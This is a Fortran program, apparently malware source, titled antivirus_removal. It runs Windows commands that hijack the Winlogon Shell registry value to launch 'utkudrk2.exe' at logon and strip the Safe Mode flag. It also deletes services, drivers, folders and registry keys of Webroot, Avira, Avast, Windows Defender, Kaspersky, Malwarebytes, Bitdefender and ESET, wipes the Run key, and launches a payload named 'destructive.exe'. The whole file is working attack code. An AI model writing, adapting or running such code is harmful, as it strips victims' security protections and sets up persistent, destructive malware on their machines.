program antivirus_removal
    implicit none
    integer :: status

    ! Check if Safe Mode is enabled
    print *, "Checking if system is in Safe Mode..."
    status = system('bcdedit /enum {current} | findstr /i "safeboot"')

    if (status /= 0) then
        ! If not in Safe Mode, run destructive.exe and exit
        print *, "Safe Mode is not enabled. Running destructive.exe..."
        status = system('"C:\Program Files\utkudrk2\destructive.exe"')
        stop
    end if

    ! If Safe Mode is active, continue with actions
    print *, "Safe Mode is enabled, proceeding with actions..."

    ! Modify the Shell registry to run the batch file
    print *, "Modifying registry to set Shell value..."
    status = system('reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f')
    ! Break the long command into two concatenated strings
    status = system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" ' // &
                    '/v Shell /t REG_SZ /d "explorer.exe, \"c:\\program files\\utkudrk2\\utkudrk2.exe\"" /f')

    ! Perform cleanup tasks
    print *, "Removing Safe Mode setting..."
    status = system('bcdedit /deletevalue {current} safeboot')

    ! Webroot non registry (do not remove antivirus files)
    print *, "Deleting Webroot related registry keys..."
    status = system('sc delete WRSkyClient')
    status = system('sc delete WRCoreService')
    status = system('sc delete WRSVC')
    status = system('del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys"')
    status = system('del /f /y "%SystemRoot%\System32\wruser.dll"')
    status = system('rd /s /q "%ProgramFiles%\Webroot"')
    status = system('rd /s /q "%ProgramFiles(x86)%\Webroot"')
    status = system('rd /s /q "%ProgramData%\WRCore"')
    status = system('rd /s /q "%ProgramData%\WRData"')
    status = system('rd /s /q "%ProgramData%\WRData"')
    status = system('rd /s /q "%ProgramFiles%\Webroot"')
    status = system('rd /s /q "%ProgramFiles(x86)%\Webroot"')
    status = system('rd /s /q "%ProgramData%\WRCore"')

    ! Avira non registry
    print *, "Deleting Avira related registry keys..."
    status = system('rd /s /q "%ProgramFiles%\Avira"')
    status = system('rd /s /q "%ProgramFiles(x86)%\Avira"')
    status = system('rd /s /q "%ProgramData%\Avira"')

    ! Deleting registry keys related to various antivirus software
    print *, "Deleting antivirus related registry keys..."
    status = system('reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f')

    ! Avast
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswApPct" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsdriver" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsdriver" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsh" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsh" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbuniv" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbuniv" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswElam" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswElam" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswKbd" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswKbd" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswMonFit" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswMonFit" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswNetHub" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswNetHub" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRdr" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f')

    ! Webroot
    status = system('reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f')
    status = system('reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f')
    status = system('reg delete "HKLM\SOFTWARE\WRData" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f')

    ! Windows Defender
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f')

    ! Kaspersky 21.3
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f')

    ! Malwarebytes
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f')

    ! Bitdefender
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f')
    status = system('reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f')

    ! ESET
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f')
    status = system('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f')

    ! Avira
    status = system('reg delete HKLM\SOFTWARE\AVIRA /f')

    print *, "Cleanup tasks completed. Safe Mode should now be removed, " // &
         "destructive.exe is scheduled to run, and Shell key is modified."

    ! Run destructive.exe
    status = system('"C:\Program Files\utkudrk2\destructive.exe"')

    if (status /= 0) then
        print *, "destructive.exe execution failed!"
    else
        print *, "destructive.exe executed successfully."
    end if

end program antivirus_removal
